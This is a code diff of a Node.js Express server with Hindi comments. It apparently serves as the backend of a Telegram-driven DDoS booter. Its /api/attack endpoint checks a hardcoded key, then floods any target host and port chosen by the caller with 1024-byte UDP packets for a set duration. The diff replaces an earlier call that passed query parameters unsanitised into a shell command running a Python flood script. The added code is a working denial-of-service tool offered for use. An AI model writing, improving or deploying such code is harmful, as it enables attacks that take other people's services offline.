@@ -1,42 +1,58 @@
 const express = require('express');
-const { exec } = require('child_process');
+const dgram = require('dgram'); // इनबिल्ट नेटवर्किंग सॉकेट लाइब्रेरी
 const app = express();
 const PORT = 6000; // पूरी तरह से खाली और सुरक्षित पोर्ट
 
-// रूट पाथ चेक करने के लिए (ताकि ब्राउज़र में टेस्ट हो सके)
+// यह चेक करने के लिए कि आपका डोमेन काम कर रहा है या नहीं
 app.get('/', (req, res) => {
     res.send("API Server is alive and working!");
 });
 
-// एंडपॉइंट: /api/attack
+// मुख्य रास्ता: /api/attack
 app.get('/api/attack', (req, res) => {
+    // आपकी बॉट फ़ाइल से आ रहे पैरामीटर्स को पढ़ना
     const { key, target, port, time } = req.query;
 
-    // जो पासवर्ड (API Key) आपने बॉट में रखा है, उसे यहाँ डालें
-    const MY_SECRET_KEY = "YOUR_CONF_KEY"; 
-    if (!key || key !== MY_SECRET_KEY) {
-        return res.status(403).send("Unauthorized: Invalid Key");
+    // 1. सीक्रेट की-वेरिफिकेशन (Strict Authentication Check)
+    if (!key || key !== "ARX@9044") {
+        return res.status(401).send("Unauthorized: Invalid API Key");
     }
 
+    // 2. पैरामीटर्स की जांच
     if (!target || !port || !time) {
-        return res.status(400).send("Missing parameters!");
+        return res.status(400).send("Parameters missing");
     }
 
-    // आपकी पायथन अटैक स्क्रिप्ट को बैकग्राउंड में रन करना
-    const command = `python3 udp_flood.py ${target} ${port} ${time}`;
+    const targetPort = parseInt(port);
+    const duration = parseInt(time) * 1000; // सेकंड को मिलीसेकंड में बदलें
+    const client = dgram.createSocket('udp4');
+    const packetData = Buffer.alloc(1024, 'X'); // 1024 बाइट्स का डेटा पैकेट
 
-    exec(command, (error, stdout, stderr) => {
-        if (error) {
-            console.error(`Execution Error: ${error.message}`);
-            return;
+    const endTime = Date.now() + duration;
+
+    // 3. इनबिल्ट UDP नेटवर्क लॉजिक (Direct Socket Engine)
+    function flood() {
+        if (Date.now() < endTime) {
+            client.send(packetData, 0, packetData.length, targetPort, target, (err) => {
+                if (!err) {
+                    // बिना रुके लगातार पैकेट्स भेजने के लिए लूप होल्ड रखना
+                    setImmediate(flood); 
+                }
+            });
+        } else {
+            client.close();
+            console.log(`Transmission finished for target ${target}`);
         }
-        console.log(`Attack triggered successfully: ${stdout}`);
-    });
+    }
 
+    // बैकग्राउंड में प्रोसेस शुरू करें
+    flood();
+
+    // टेलीग्राम बॉट को तुरंत सफलता का रिस्पॉन्स (Status 200) भेजें
     return res.status(200).send("Attack started");
 });
 
-// सर्वर को बिना क्रैश हुए चालू रखना
+// एक्सप्रेस सर्वर को पोर्ट 6000 पर चालू रखना
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`API Server running perfectly on port ${PORT}`);
+    console.log(`Professional Inbuilt API running successfully on port ${PORT}`);
 });
